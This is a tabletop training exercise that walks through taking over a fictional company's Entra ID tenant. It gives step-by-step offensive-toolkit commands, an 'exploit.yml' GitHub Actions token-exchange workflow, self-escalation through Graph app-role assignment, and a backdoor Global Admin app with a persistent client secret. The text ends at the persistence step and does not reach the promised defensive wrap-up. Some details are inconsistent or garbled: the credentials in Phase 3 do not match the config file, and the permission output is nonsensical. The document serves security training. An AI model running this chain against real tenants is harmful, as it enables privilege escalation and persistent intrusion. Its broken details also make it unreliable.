# 🎯 TABLETOP EXERCISE: Complete Tenant Takeover via Exposed Configuration

## Exercise Overview

| Attribute | Details |
|-----------|---------|
| **Duration** | 60 minutes |
| **Difficulty** | Advanced |
| **Attack Type** | Multi-stage privilege escalation |
| **Final Objective** | Complete Entra ID tenant takeover |
| **Scenario Company** | Blue Mountain Travel Ltd. |

### Learning Objectives

1. Understand how exposed configuration files lead to complete compromise
2. Trace an attack path from anonymous access to Global Admin
3. Identify detection opportunities at each attack stage
4. Implement preventive controls and monitoring

---

## 🗺️ Attack Flow Diagram

```mermaid
flowchart LR
    subgraph Phase1["🔍 Phase 1: Anonymous<br/>(5 min)"]
        A1[Find-PublicStorageContainer]
        A2[Get-PublicBlobContent -IncludeDeleted]
        A3[Download Deleted Email]
        A4[Read-SASToken]
    end

    subgraph Phase2["📦 Phase 2: Storage<br/>(10 min)"]
        B1[Get-FileShareContent]
        B2[Find Default Passwords]
        B3[Get-FileShareContent -Recurse]
        B4[Extract App Secret]
    end

    subgraph Phase3["🔎 Phase 3: Azure Recon<br/>(10 min)"]
        C1[Connect-ServicePrincipal]
        C2[Get-RoleAssignment]
        C3[Get-ManagedIdentity]
        C4[Get-ServicePrincipalsPermission]
    end

    subgraph Phase4["⚡ Phase 4: UAMI<br/>(15 min)"]
        D1[Set-FederatedIdentity]
        D2[GitHub OIDC Token]
        D3[Exchange for UAMI Token]
    end

    subgraph Phase5["👑 Phase 5: Takeover<br/>(5 min)"]
        E1[Set-ManagedIdentityPermission]
        E2[Add-EntraApplication]
        E3[Global Admin!]
    end

    Phase1 --> Phase2 --> Phase3 --> Phase4 --> Phase5

    style Phase1 fill:#e3f2fd,stroke:#1976d2
    style Phase2 fill:#fff3e0,stroke:#f57c00
    style Phase3 fill:#e8f5e9,stroke:#388e3c
    style Phase4 fill:#fce4ec,stroke:#c2185b
    style Phase5 fill:#ffebee,stroke:#d32f2f
```

### Attack Path Summary

```mermaid
flowchart TD
    A[👤 Anonymous Attacker] -->|DNS Enumeration| B[🌐 Public Blob Container Found]
    B -->|Get-PublicBlobContent -IncludeDeleted| C[📧 Deleted Welcome Email]
    C -->|Extract SAS Token from link| D[🔑 Access to File Share]

    D --> E{What's in the storage?}

    E -->|Employee Folders| F[👤 Default Passwords]
    E -->|Forgotten /config folder| G[📄 App Secret]

    F -->|Login as User| H[Lateral Movement Path]

    G -->|Connect-ServicePrincipal| I[🔓 Azure Access]
    I -->|Get-ManagedIdentity| J[🎯 UAMI Discovered]
    J -->|Get-ServicePrincipalsPermission| K[⚠️ AppRoleAssignment.ReadWrite.All]
    K -->|Set-FederatedIdentity| L[🔗 GitHub OIDC Trust]
    L -->|Token Exchange| M[🎫 UAMI Token]
    M -->|Set-ManagedIdentityPermission| N[⬆️ Self-Escalation]
    N -->|Add-EntraApplication| O[👑 Global Admin!]

    style A fill:#e3f2fd
    style O fill:#ffcdd2
    style K fill:#fff9c4
    style F fill:#fff9c4
    style C fill:#fff9c4
```

---

## ⏱️ Session Agenda (60 Minutes)

| Time | Phase | Activity |
|------|-------|----------|
| 0:00-0:05 | Introduction | Scenario background, company profile |
| 0:05-0:10 | Phase 1 | Anonymous Reconnaissance |
| 0:10-0:20 | Phase 2 | Storage Access & Credential Extraction |
| 0:20-0:30 | Phase 3 | Authenticated Azure Reconnaissance |
| 0:30-0:45 | Phase 4 | UAMI Exploitation & Federated Credential Abuse |
| 0:45-0:55 | Phase 5 | Tenant Takeover & Persistence |
| 0:55-1:00 | Wrap-up | Detections, Defenses, Key Takeaways |

---

## 🏢 Scenario Background

### Company Profile: Blue Mountain Travel Ltd.

Blue Mountain Travel is a UK-based travel agency undergoing digital transformation. They recently migrated their HR onboarding portal to Azure, using:

- **Azure App Service** for the HR portal
- **Azure Files** for onboarding document storage
- **Azure SQL** for HR database
- **User Assigned Managed Identity (UAMI)** for CI/CD automation
- **GitHub Actions** for deployment pipelines

### The Misconfiguration Timeline

```mermaid
timeline
    title How the Vulnerability Chain Was Created
    2025-06-15 : DevOps creates UAMI for HR CI/CD
               : UAMI gets broad permissions "just in case"
    2025-10-05 : Config file with app secret copied to file share
               : "Backup" in /config folder
    2025-11-15 : IT renames config folder, forgets to delete
               : Folder still exists, just overlooked
    2026-01-15 : HR uploads welcome email to WRONG container
               : Onboarding-Welcome-Email.eml in public blob
    2026-01-16 : HR notices mistake and deletes the email
               : But versioning is enabled - file still exists!
    2026-01-20 : New employees onboarded
               : Welcome docs with default passwords uploaded
    2026-01-22 : TODAY - Attacker discovers the chain
               : Attack begins
```

| Date | Event | Risk Created |
|------|-------|--------------|
| 2025-06-15 | DevOps creates UAMI for HR automation | Broad permissions granted "for future use" |
| 2025-10-05 | Config file copied to Azure Files `/config` folder | App secret exposed in storage |
| 2025-11-15 | IT renames folder to hide it, forgets to delete | Files still accessible to anyone with share access |
| 2026-01-15 | HR uploads `Onboarding-Welcome-Email.eml` to **public container** | Email contains SAS token link to Azure Files |
| 2026-01-16 | HR deletes the email after noticing the mistake | **Versioning enabled** - deleted file still enumerable! |
| 2026-01-20 | New employee onboarding batch processed | Welcome docs with default passwords uploaded |
| 2026-01-22 | **TODAY**: Attacker discovers the chain | Attack begins |

### The Permission Creep Story

> **How did the UAMI get `AppRoleAssignment.ReadWrite.All`?** This is the insidious one. HR automation legitimately needs to assign new employees to SaaS applications (Salesforce, ServiceNow, etc.). The permission name sounds harmless - "assign app roles" - but it's actually one of the most dangerous permissions in Microsoft Graph.

| Permission | Justification Given | Actual Need | Real Risk |
|------------|---------------------|-------------|----------|
| `User.ReadWrite.All` | "Create new employee accounts" |  Legitimate | Medium |
| `Group.ReadWrite.All` | "Add employees to department groups" |  Legitimate | Medium |
| `Application.Read.All` | "Read app info to validate assignments" |  Sounds safe (read-only) | Low |
| `AppRoleAssignment.ReadWrite.All` | "Assign new employees to Salesforce, ServiceNow, etc." |  Sounds legitimate | **CRITICAL** |

**Why `AppRoleAssignment.ReadWrite.All` is so dangerous:**

```
"We need to assign new hires to enterprise apps" ← Sounds reasonable
                    +
AppRoleAssignment.ReadWrite.All grants this ← Approved!
                    +
But this permission can also grant ANY permission to ANY app ← Not understood
                    =
Attacker can grant themselves RoleManagement.ReadWrite.Directory 💀
```

**The hidden attack path:**

```powershell
# Step 1: Grant the UAMI more permissions (using AppRoleAssignment.ReadWrite.All)
Set-ManagedIdentityPermission -servicePrincipalId $UamiObjectId `
    -CommonResource MicrosoftGraph `
    -appRoleName "RoleManagement.ReadWrite.Directory"

# Step 2: Now the UAMI can assign Global Admin
Add-EntraApplication -DisplayName "Backdoor-App"
```

---

## 📁 Storage Structure & Exposed Files

### Public Blob Container (hr-templates) - With Versioning Enabled

```
bluemountaintravelsa (Storage Account)
├── templates (Blob Container - PUBLIC ACCESS + VERSIONING)
│   └── 🗑️ Onboarding-Welcome-Email.eml    ← DELETED but version exists!
│                                            Contains SAS token to Azure Files
```

**The deleted email is invisible in normal listing, but `Get-PublicBlobContent -IncludeDeleted` reveals it!**

### Private File Share (docs) - Accessible via SAS Token in Email

```
bluemountaintravelsa (Storage Account)
├── docs (File Share - Private, but SAS token leaked in deleted email)
│   ├── /config                      ← Forgotten folder (IT thought they deleted it)
│   │   └── app-config.json          ← App Registration secret
│   ├── /peter-parker
│   │   ├── Welcome.html             ← Default password: Travel@2026!
│   │   ├── First-Day-Instructions.html
│   │   ├── IT-Equipment.html
│   │   └── Training-Schedule.html
│   ├── /hermione-granger
│   │   └── Welcome.html             ← Default password: Travel@2026!
│   ├── /luke-skywalker
│   │   └── Welcome.html             ← Default password: Travel@2026!
│   └── ... more employee folders
```

### Exposed Configuration File

**File: `/config/app-config.json`** (Forgotten folder - never properly cleaned up)

```json
{
  "environment": "production",
  "azure": {
    "tenantId": "67f8647a-6555-4c70-bee4-45625d332c3f",
    "subscriptionId": "a1b2c3d4-e5f6-7890-abcd-ef1234567890"
  },
  "deployment": {
    "clientId": "1950a258-227b-4e31-a9cf-717495945fc2",
    "clientSecret": "Kvj8Q~9pL2mN4wR8vB3cH6jK1fE5gT0yU.aI7dO2"
  }
}
```

**Note:** This config only exposes an App Registration secret. The attacker must use authenticated reconnaissance to discover what this identity can access, and find the UAMI.

---

## 🎭 PHASE 1: Anonymous Reconnaissance (5 minutes)

### Attacker Actions

```powershell
# Step 1: DNS record discovery
Find-DnsRecords -Domains "bluemountaintravel.uk"

# Step 2: Find DNS records for Azure resources
Find-AzurePublicResource -Name "bluemountaintravel"

# Step 3: Discover public storage containers
Find-PublicStorageContainer -StorageAccountName "bluemountaintravelsa"

# Output:
# StorageAccount         Container   FileCount    IsEmpty
# --------------        ---------    ---------    -------
# bluemountaintravelsa  templates            0    <-- Public container!

```

### Discovering Deleted Files

**But wait - what if there are deleted files with versioning enabled?**

```powershell
# Step 5: Check for deleted blobs using BlackCat
Get-PublicBlobContent -StorageAccountName bluemountaintravelsa -ContainerName templates -IncludeDeleted

# Output:
# Name                           Status       VersionId
# ----                           ------       ---------
# Onboarding-Welcome-Email.eml   🗑️ Deleted   2026-01-15T14:32:00Z

# Step 6: Download the deleted email
Get-PublicBlobContent -StorageAccountName bluemountaintravelsa -ContainerName templates -IncludeDeleted -OutputPath ./loot -Download

# ✅ Downloaded: Onboarding-Welcome-Email.eml
```

### Inspecting the .eml File

An `.eml` file is just a text file - open it in any editor or simply display it:

```powershell
# Option 1: Open in mail client
Invoke-Item ./loot/Onboarding-Welcome-Email.eml

# Option 2: Display in terminal
Get-Content ./loot/Onboarding-Welcome-Email.eml

# Option 3: Open in VS Code (demo-friendly!)
code ./loot/Onboarding-Welcome-Email.eml

# Option 4: Search for any URLs
Select-String -Path ./loot/*.eml -Pattern "https://"
```

**What we see in the email (scrolling through the HTML):**

```html
<ul>
    <li><a href="https://bluemountaintravelsa.file.core.windows.net/docs/firstname-lastname/Welcome.html?sv=2024-11-04&ss=f&srt=sco&sp=rl&se=2028-01-21T22:14:47Z&st=2026-01-21T13:59:47Z&spr=https,http&sig=X568VG5xyLVY9xLl9eoSa4oJM0wzRIkLHeHlixtwAkM%3D">
        <strong>Welcome.html</strong></a> - Your temporary login credentials</li>
    ...
</ul>
```

**Attacker immediately notices:**
- Azure Storage URL (`bluemountaintravelsa.file.core.windows.net`)
- Long query string = SAS token
- Multiple links all share the same token

**Copy the URL and test it in browser - it works!**

**Analyze the SAS token:**

```powershell
$sasToken = "?sv=2024-11-04&ss=f&srt=sco&sp=rl&se=2028-01-21..."
Read-SASToken -SASToken $sasToken

# Output shows:
#   Service: File
#   ResourceTypes: Service, Container, Object  <-- srt=sco!
#   Permissions: Read, List                    <-- Can enumerate everything!
#   Expiry: 2028-01-21                         <-- Valid for 2+ years!

# The SAS token was meant for ONE user's folder, but srt=sco means
# it can enumerate the ENTIRE file share!
```

### Discussion Points
- Why did `Get-PublicBlobContent -ListOnly` show no files, but `-IncludeDeleted` found one?
- HR deleted the email to "fix" the mistake - why didn't that work?
- What's the difference between soft-delete and versioning?
- The SAS token was scoped too broadly (`srt=sco`) - what should it have been?

### Detection Opportunities

| Detection | Log Source | Query |
|-----------|------------|-------|
| Public container listing with versions | Storage Analytics | Anonymous LIST with `include=versions` |
| Download of deleted blob version | Storage Analytics | GET with `?versionId=` parameter |
| Enumeration from unknown IP | Storage Analytics | Anonymous operations from unexpected geo |

---

## 🔓 PHASE 2: Storage Access & Credential Extraction (10 minutes)

### Attacker Actions

The SAS token from the deleted email was meant for a single user's folder, but it was created with overly broad scope (`srt=sco` = Service, Container, Object). This means it can access the **entire file share**!

```powershell
# Using the SAS token extracted from the deleted email
$storageAccount = "bluemountaintravelsa"
$fileShare = "docs"
$sasToken = "?sv=2024-11-04&ss=f&srt=sco&sp=rl&se=2028-01-21T22:14:47Z&st=2026-01-21T13:59:47Z&spr=https,http&sig=X568VG5xyLVY9xLl9eoSa4oJM0wzRIkLHeHlixtwAkM%3D"

# Step 1: Use BlackCat's Get-FileShareContent to enumerate the file share
Get-FileShareContent -StorageAccountName $storageAccount -FileShareName $fileShare -SasToken $sasToken

# Output:
# Name                Type        Size        LastModified
# ----                ----        ----        ------------
# config              Directory               2025-11-15T10:30:00Z
# peter-parker        Directory               2026-01-20T09:15:00Z
# hermione-granger    Directory               2026-01-20T09:15:00Z
# luke-skywalker      Directory               2026-01-20T09:15:00Z
# ... more employee folders

# Step 2: Recursively enumerate ALL content (reveals the full structure)
Get-FileShareContent -StorageAccountName $storageAccount -FileShareName $fileShare -SasToken $sasToken -Recurse

# This reveals everything in one command - employee folders AND their contents!
```

### 🔑 Discovery 1: Default Passwords in Onboarding Documents

```powershell
# Step 3: Enumerate a specific employee folder
Get-FileShareContent -StorageAccountName $storageAccount -FileShareName $fileShare -Path "peter-parker" -SasToken $sasToken

# Output:
# Name                        Type    Size      LastModified
# ----                        ----    ----      ------------
# Welcome.html                File    4.2 KB    2026-01-20T09:15:00Z
# First-Day-Instructions.html File    2.1 KB    2026-01-20T09:15:00Z
# IT-Equipment.html           File    1.8 KB    2026-01-20T09:15:00Z
# Training-Schedule.html      File    3.5 KB    2026-01-20T09:15:00Z

# Step 4: Download the welcome document (using the SAS token directly)
$welcomeUrl = "https://$storageAccount.file.core.windows.net/$fileShare/peter-parker/Welcome.html$sasToken"
Invoke-WebRequest -Uri $welcomeUrl -OutFile "Welcome-Peter-Parker.html"
```

**Welcome document contains default password:**

```html
<div class="credential-box">
    <div class="credential-row">
        <span class="credential-label">Email/Username:</span>
        <span class="credential-value">peter.parker@bluemountaintravel.uk</span>
    </div>
    <div class="credential-row">
        <span class="credential-label">Temporary Password:</span>
        <span class="credential-value password-highlight">Travel@2026!</span>
    </div>
</div>
```

> **⚠️ Attack Path Option:** If Peter Parker hasn't logged in yet to change his password, the attacker can now access the tenant as a legitimate user! This is a **separate attack vector** that we'll note but won't follow in this exercise.

### 🔐 Discovery 2: App Configuration with Secrets

The recursive enumeration reveals a `/config` directory that was supposed to be removed but was only "hidden" by renaming. IT thought they cleaned up, but the folder still exists!

```powershell
# Step 5: The recursive enumeration already revealed everything, including the config folder
# Look at the output from Step 2 - there's a /config directory!

# Step 6: Enumerate the forgotten config folder
Get-FileShareContent -StorageAccountName $storageAccount -FileShareName $fileShare -Path "config" -SasToken $sasToken

# Output:
# Name                Type    Size      LastModified
# ----                ----    ----      ------------
# app-config.json     File    512 B     2025-10-05T14:22:00Z    ← App secret here!

# Step 7: Download the configuration file
$configFileUrl = "https://$storageAccount.file.core.windows.net/$fileShare/config/app-config.json$sasToken"
Invoke-RestMethod -Uri $configFileUrl -OutFile "app-config.json"

# Step 8: Extract credentials
$config = Get-Content app-config.json | ConvertFrom-Json
$tenantId = $config.azure.tenantId
$clientId = $config.deployment.clientId
$clientSecret = $config.deployment.clientSecret

Write-Host "Found credentials for App: $clientId in tenant: $tenantId"
```

> **📝 Note on Azure Files Soft-Delete:** Unlike Azure Blob Storage, Azure Files soft-delete only works at the **share level**, not at the file/directory level. You cannot recover individual deleted files within a share via the REST API. For file-level recovery, use Azure File Share Snapshots or Azure Backup.

### What Was Found

| Secret Type | Value | Impact |
|-------------|-------|--------|
| **Employee Credentials** | `peter.parker@bluemountaintravel.uk` / `Travel@2026!` | User account access (if not changed) |
| **More Employees** | Same pattern in other folders | Multiple potential access points |
| Tenant ID | `67f8647a-6555-...` | Target tenant identified |
| Subscription ID | `a1b2c3d4-e5f6-...` | Azure scope for enumeration |
| Client ID | `1950a258-227b-...` | App Registration to authenticate as |
| Client Secret | `Kvj8Q~9pL2...` | **Leads to complete takeover!** |

### Two Attack Paths Identified

```mermaid
flowchart TD
    A[📦 Azure Files Access] --> B{What did we find?}

    B --> C[👤 Employee Credentials]
    B --> D[🔑 App Registration Secret]

    C --> E[Login as new employee]
    E --> F[Phishing / Data Access / Lateral Movement]

    D --> G[Connect-ServicePrincipal]
    G --> H[Enumerate Azure Resources]
    H --> I[Find UAMI with Graph Permissions]
    I --> J[👑 Complete Tenant Takeover]

    style D fill:#ffcdd2
    style J fill:#ffcdd2
    style C fill:#fff9c4

    linkStyle 3 stroke:#f44336,stroke-width:3px
    linkStyle 4 stroke:#f44336,stroke-width:3px
    linkStyle 5 stroke:#f44336,stroke-width:3px
    linkStyle 6 stroke:#f44336,stroke-width:3px
```

**We'll follow the App Registration path (red) - it leads to Global Admin!**

### Discussion Points
- Which finding is more immediately dangerous: employee passwords or app secret?
- How could the employee passwords be exploited in a real attack?
- What makes the "deleted" config file still accessible?

### Detection Opportunities

| Detection | Log Source | Alert |
|-----------|------------|-------|
| Access to soft-deleted items | Storage Analytics | Access to files in `$deleted` paths |
| Bulk enumeration of user folders | Storage Analytics | Directory listing multiple paths |
| Access to sensitive file patterns | Storage Analytics | Access to `*.json`, `*.yaml`, `*.html` in bulk |

---

## 🔍 PHASE 3: Authenticated Azure Reconnaissance (10 minutes)

**This is the critical discovery phase using BlackCat functions!**

### Step 1: Authenticate with Stolen Credentials

```powershell
# Connect using the stolen App Registration credentials
$params = @{
    ServicePrincipalId = "12b684d1-68be-4dc9-90c2-0ab270402124"
    TenantId = "3da86d62-c862-48da-973f-487ab98166a8"
    ClientSecret = "eOD8Q~YoI1~hshRyyUJ9x1kNWAAD1csMl.4pvcY4"
    SubscriptionId = "cc826ab7-e046-4422-8e68-ba57b6d48165"
}

Connect-ServicePrincipal @params

# Output shows:
#   DisplayName: HR-Onboarding-Legacy-Deployment
#   Roles: Contributor (subscription scope!)
```

### Step 2: Discover What We Can Access

```powershell
# Check our role assignments - what can this SP do?
Get-RoleAssignment -CurrentUser

# Output:
# RoleName          Scope                           PrincipalType
# --------          -----          -------------
# Contributor       /subscriptions/a1b2c3d4...      ServicePrincipal

# Contributor on entire subscription = we can modify resources!
```

### Step 3: Enumerate Managed Identities

```powershell
# Find all User Assigned Managed Identities in the subscription
Get-ManagedIdentity

# Output:
# Name                      ResourceGroup          ClientId                              Location
# ----                      -------------          --------                              --------
# uami-hr-cicd-automation   rg-hr-infrastructure   3fa85f64-5717-4562-b3fc-2c963f66afa6  uksouth
# uami-backup-service       rg-shared-services     8b2e4f91-...                          uksouth

# The CI/CD automation identity is interesting - let's check its permissions!
```

### Step 4: Analyze UAMI Permissions

```powershell
# Check what Graph API permissions the UAMI has
Get-ServicePrincipalsPermission -ServicePrincipalId "197e935d-02a7-4ca3-98a2-a2b0ffc389f6"

# Output:
# DisplayName: uami-hr-cicd-automation
#
# Application Permissions:
#   Permission                              ResourceApp
#   ----------                              -----------
#   User.ReadWrite.All                      Microsoft Graph    ← Create employee accounts
#   Group.ReadWrite.All                     Microsoft Graph    ← Add users to groups
#   Application.Read.All                    Microsoft Graph    ← Read app info for assignments
#   AppRoleAssignment.ReadWrite.All         Microsoft Graph    ← Assign users to apps
#
# Wait... AppRoleAssignment.ReadWrite.All? That sounds harmless...
#
# ⚠️ CRITICAL INSIGHT: AppRoleAssignment.ReadWrite.All is deceptively named!
# It enables POST /servicePrincipals/{id}/appRoleAssignments, which means:
#   1. Assign users to applications (the "legitimate" use)
#   2. Grant ANY Graph API permission to ANY service principal!
#   3. Including granting Application.ReadWrite.All + RoleManagement.ReadWrite.Directory to ITSELF
#   = Self-escalation to tenant takeover!
#
# Required permission for Set-ManagedIdentityPermission: ✅ AppRoleAssignment.ReadWrite.All (already present!)
#
# This permission was approved because "HR needs to assign new employees to
# Salesforce and ServiceNow". Nobody realized the hidden danger.
```

### Step 5: Check for Existing Federated Credentials

```powershell
# Get any federated identity credentials on the UAMI
Get-FederatedIdentityCredential -Name "uami-hr-cicd-automation"

# Output shows existing GitHub trust:
#   Name: uami-hr-cicd-automation
#   Credential Name : github-actions-main
#   Subject: repo:blue-mountain-travel/hr-onboarding-portal:ref:refs/heads/main
#   Issuer: https://token.actions.githubusercontent.com

# This UAMI already trusts GitHub - we can add another federated credential!
```

### Key Findings Summary

| Discovery | Implication |
|-----------|-------------|
| SP has Contributor on subscription | Can modify any Azure resource, including UAMIs |
| UAMI has `User.ReadWrite.All` + `Group.ReadWrite.All` | Legitimate for HR onboarding |
| UAMI has `Application.Read.All` | Enables SP lookup - seems harmless but critical for attack |
| UAMI has `AppRoleAssignment.ReadWrite.All` | **CRITICAL!** Can grant ANY permission to ANY service principal |
| **Self-Escalation Path** | Use `Application.Read.All` to lookup MS Graph SP + `AppRoleAssignment.ReadWrite.All` to grant permissions |
| UAMI already has GitHub FIC | Pattern is established, another FIC won't be suspicious |

### Discussion Points
- What made `Get-ManagedIdentity` so valuable?
- Why is Contributor + UAMI with Graph permissions a devastating combination?
- How would you detect this enumeration activity?

### Detection Opportunities

| Detection | Log Source | Alert |
|-----------|------------|-------|
| Service principal sign-in | Entra ID Sign-in Logs | Login from unexpected IP/location |
| Enumeration of managed identities | Azure Activity Log | List operations on Microsoft.ManagedIdentity |
| Graph API permission queries | Entra ID Audit Logs | Reading appRoleAssignments |

---

## ⚡ PHASE 4: UAMI Exploitation via Federated Credentials (15 minutes)

### Understanding the Attack Chain

```mermaid
flowchart TD
    A[🐙 Attacker's GitHub Repository] -->|1. Workflow triggers| B[📜 GitHub OIDC Token]

    subgraph Azure["☁️ Azure / Entra ID"]
        C[🔐 UAMI with FIC]
        D[🎫 UAMI Access Token]
        E[📊 Microsoft Graph API]
    end

    B -->|2. Token Exchange| C
    C -->|3. Issues token with| D
    D -->|4. Has AppRoleAssignment.ReadWrite.All| E

    subgraph Escalation["⬆️ Self-Escalation"]
        S1[Set-ManagedIdentityPermission]
        S2[Grant RoleManagement.ReadWrite.Directory]
    end

    E -->|5. Escalate permissions| S1
    S1 --> S2
    S2 -->|6. Now can assign roles| F[Add-EntraApplication]
    F -->|7. Create app + Global Admin| G[👑 Tenant Takeover]

    subgraph Prerequisite["⚙️ Prerequisite: Add FIC to UAMI"]
        P1[SP with Contributor] -->|Set-FederatedIdentity| P2[Trust attacker's repo]
    end

    P2 -.->|Enables| A

    style A fill:#24292e,color:#fff
    style G fill:#ffcdd2
    style C fill:#e3f2fd
    style D fill:#c8e6c9
    style S2 fill:#fff9c4
```

### Permission Boundary Crossing

```mermaid
flowchart LR
    subgraph AzureRBAC["🔷 Azure RBAC Boundary"]
        AR1[Contributor Role]
        AR2[Modify UAMI Resource]
        AR3[Add Federated Credential]
    end

    subgraph EntraID["🔶 Entra ID Boundary"]
        EI1[UAMI Service Principal]
        EI2[AppRoleAssignment.ReadWrite.All]
        EI3[Set-ManagedIdentityPermission]
        EI4[Grant RoleManagement.ReadWrite.Directory]
        EI5[Add-EntraApplication + Global Admin]
    end

    AR1 --> AR2 --> AR3
    AR3 -->|"Crosses Boundary!"| EI1
    EI1 --> EI2 --> EI3 --> EI4 --> EI5

    style AR3 fill:#fff9c4,stroke:#f57f17
    style EI1 fill:#fff9c4,stroke:#f57f17
    style EI4 fill:#ffcdd2,stroke:#d32f2f
```

### Step 1: Add Federated Credential to UAMI

```powershell
# Use BlackCat's Set-FederatedIdentity to add attacker's GitHub repo
# The SP from Phase 3 has Contributor on the subscription = can modify UAMI

$uamiId = "/subscriptions/a1b2c3d4-e5f6-7890-abcd-ef1234567890/resourceGroups/rg-hr-infrastructure/providers/Microsoft.ManagedIdentity/userAssignedIdentities/uami-hr-cicd-automation"

Set-FederatedIdentity `
    -ManagedIdentityName "uami-hr-cicd-automation" `
    -Name "github-backup-automation" `
    -GitHubOrganization "azurekid" `
    -GitHubRepository "blackcat" `
    -Branch "main"

# This creates a trust: UAMI now accepts tokens from attacker's GitHub repo
```

### Step 2: Create GitHub Actions Workflow (Attacker's Repository)

```yaml
# .github/workflows/exploit.yml
name: Azure Access
on: workflow_dispatch

permissions:
  id-token: write
  contents: read

env:
  AZURE_TENANT_ID: "67f8647a-6555-4c70-bee4-45625d332c3f"
  UAMI_CLIENT_ID: "3fa85f64-5717-4562-b3fc-2c963f66afa6"

jobs:
  get-token:
    runs-on: ubuntu-latest
    steps:
      - name: Get GitHub OIDC Token
        id: oidc
        run: |
          OIDC_TOKEN=$(curl -sLS "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" \
            -H "Accept: application/json" \
            -H "Authorization: Bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" | jq -r '.value')
          echo "::add-mask::$OIDC_TOKEN"
          echo "oidc_token=$OIDC_TOKEN" >> $GITHUB_OUTPUT

      - name: Exchange for UAMI Token (Graph API scope)
        run: |
          GRAPH_TOKEN=$(curl -sX POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
            -H "Content-Type: application/x-www-form-urlencoded" \
            -d "client_id=$UAMI_CLIENT_ID" \
            -d "grant_type=client_credentials" \
            -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
            -d "client_assertion=${{ steps.oidc.outputs.oidc_token }}" \
            -d "scope=https://graph.microsoft.com/.default" | jq -r '.access_token')

          # Now we have a token with Application.ReadWrite.All!
          echo "Got Graph token for UAMI - ready for Phase 5"
```

### Discussion Points
- Why can Contributor role modify UAMI federated credentials?
- What's the difference between Azure RBAC and Entra ID permissions?
- Why is this a "permission boundary crossing" attack?
- How would legitimate security teams detect a new FIC?

### Detection Opportunities

| Detection | Log Source | Alert |
|-----------|------------|-------|
| New Federated Credential | Azure Activity Log | `Microsoft.ManagedIdentity/userAssignedIdentities/federatedIdentityCredentials/write` |
| Unknown GitHub repository | Entra ID Sign-in Logs | Federated sign-in from unexpected issuer/subject |
| UAMI token for Graph API | Entra ID Sign-in Logs | Service principal authentication to Graph |
| Service principal auth from unexpected IP | Entra ID Sign-in Logs | GeoIP anomaly for service principal |

---

## 👑 PHASE 5: Tenant Takeover (5 minutes)

### Step 0: Authenticate with UAMI Token from GitHub Actions Pipeline

The GitHub Actions workflow (exploit.yml) outputs a base64-encoded UAMI token for Graph API. Use `Connect-GraphToken` to authenticate:

```powershell
# Get the base64-encoded token from the GitHub Actions workflow output
# (Copy from the workflow logs)
$b64Token = "ZXlKMGVYQWlPaUpLVjFRaUxDSnViMjVqWlNJNklqTXhVakpNTm1KMlpqTnBNRmR1TjNodU5tMVBPR1Y1ZERkdFpVSnJjVnBrTjFWeFIzaE5OMDE1TTAwaUxDSmhiR2NpT2lKU1V6STFOaUlzSW5nMWRDSTZJbEJqV0RrNFIxZzBNakJVTVZnMmMwSkVhM3BvVVcxeFozZE5WU0lzSW10cFpDSTZJbEJqV0RrNFIxZzBNakJVTVZnMmMwSkVhM3BvVVcxeFozZE5WU0o5Lmv5bGRhMDdmMDk0OGI3MzA4MzZjZGY0YjZkZmIxOGI1OGI5YjE4ODg2MzA1NjM4MjFmNzY2YTdhYmZlNGVlMzc3Mw=="

# Authenticate using Connect-GraphToken with base64-encoded token
Connect-GraphToken -AccessToken $b64Token -asBase64 -EndpointType MSGraph

# Output shows successful authentication:
# ✓ Connected to MSGraph as uami-hr-cicd-automation
#   Endpoint: https://graph.microsoft.com
#   Permissions: outlincomes-scope:scope:timed-notifications.beta
#   Token expires: 2026-02-04 21:04:11 UTC
```

Now all subsequent BlackCat commands will use this authenticated UAMI session.

### Step 1: Self-Escalation via Set-ManagedIdentityPermission

The UAMI token has `AppRoleAssignment.ReadWrite.All`. This permission can grant **any** Graph API permission to **any** service principal - including itself!

```powershell
# The UAMI is now authenticated via Connect-GraphToken
# Use BlackCat's Set-ManagedIdentityPermission to escalate the UAMI's own permissions

$uamiId = "197e935d-02a7-4ca3-98a2-a2b0ffc389f6"

# Grant the UAMI the ability to create applications
Set-ManagedIdentityPermission `
    -servicePrincipalId $uamiId `
    -CommonResource MicrosoftGraph `
    -appRoleName "Application.ReadWrite.All"

# Grant the UAMI the ability to assign directory roles
Set-ManagedIdentityPermission `
    -servicePrincipalId $uamiId `
    -CommonResource MicrosoftGraph `
    -appRoleName "RoleManagement.ReadWrite.Directory"

# The UAMI just granted ITSELF both permissions needed for complete takeover!
```

**Why this works:**
- The UAMI has `Application.Read.All` (granted for "reading app info to validate assignments")
- This permission allows `Set-ManagedIdentityPermission` to look up the Microsoft Graph service principal
- Combined with `AppRoleAssignment.ReadWrite.All`, it can grant ANY permission to ANY service principal
- Including granting powerful permissions to itself!

### Step 2: Create Enterprise Application for Persistent Access

After the UAMI has granted itself the required permissions (`Application.ReadWrite.All` and `RoleManagement.ReadWrite.Directory`), create an Enterprise Application with Global Administrator role:

```powershell
# Now that the UAMI has both Application.ReadWrite.All and RoleManagement.ReadWrite.Directory
# (granted to itself in Step 1), we can use Add-EntraApplication to create a backdoor app

# Use BlackCat's Add-EntraApplication to create a malicious app with Global Admin
Add-EntraApplication -DisplayName "Azure-Backup-Automation-Service"

# This function automatically:
# 1. Creates an App Registration (requires Application.ReadWrite.All)
# 2. Creates a Service Principal
# 3. Assigns Global Administrator role to the SP (requires RoleManagement.ReadWrite.Directory)
# 4. Returns the App details for credential creation
```

### Output from Add-EntraApplication

```
DisplayName                 : Azure-Backup-Automation-Service
ApplicationId               : 9a8b7c6d-5e4f-3210-fedc-ba0987654321
ApplicationObjectId         : abc12345-6789-0def-1234-567890abcdef
ServicePrincipalObjectId    : def98765-4321-0fed-cba9-876543210fed
RoleAssignmentName          : Global Administrator
RoleTemplateId              : 62e90394-69f5-4237-9190-012177145e10
```

### Creating Persistence (Client Secret)

```powershell
# Use BlackCat's Set-ServicePrincipalCredential to add a client secret for persistent access
Set-ServicePrincipalCredential -ObjectId $app.ApplicationObjectId -Action AddPassword -GenerateSecret

# Output:
# ObjectId              : abc12345-6789-0def-1234-567890abcdef
# CredentialType        : Password
# KeyId                 : 7a8b9c0d-1e2f-3456-7890-abcdef123456
# DisplayName           : BlackCat-Generated-Secret
# StartDateTime         : 2026-02-02T10:30:00Z
# EndDateTime           : 2028-02-02T10:30:00Z
